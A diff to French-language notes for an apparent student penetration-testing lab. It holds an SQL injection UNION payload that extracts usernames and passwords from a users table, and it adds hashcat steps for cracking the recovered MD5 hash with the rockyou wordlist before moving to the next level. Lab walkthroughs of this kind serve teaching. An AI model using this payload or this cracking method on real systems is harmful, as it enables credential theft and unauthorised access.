@@ -1,4 +1,4 @@
-## SAE Pentest
+y## SAE Pentest
 
 Accueil
 
@@ -47,11 +47,25 @@ Voici le payload SQL.
 PAYLOAD = ' UNION SELECT NULL, username, password, NULL, NULL FROM users #
 
 recupere le hash de Llywi Minllegui alleer sur kali et faire un force avec hashcat par ex.
+avoir un fichier hash.txt qui comprend le hash recupere
 
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
+-m 0 : Spécifie que le hash est de type MD5.
+
+-a 0 : Mode d'attaque par dictionnaire.
+
+hash.txt : Fichier contenant le hash MD5.
+
+/usr/share/wordlists/rockyou.txt : Chemin vers le fichier de dictionnaire.
 
 
 Aller au prochain niveau se connected avec ce password recupere et realiser la prochaine etape.
+
+
+
+
+
 
 *** 9 Level Attaque XSS ***
 
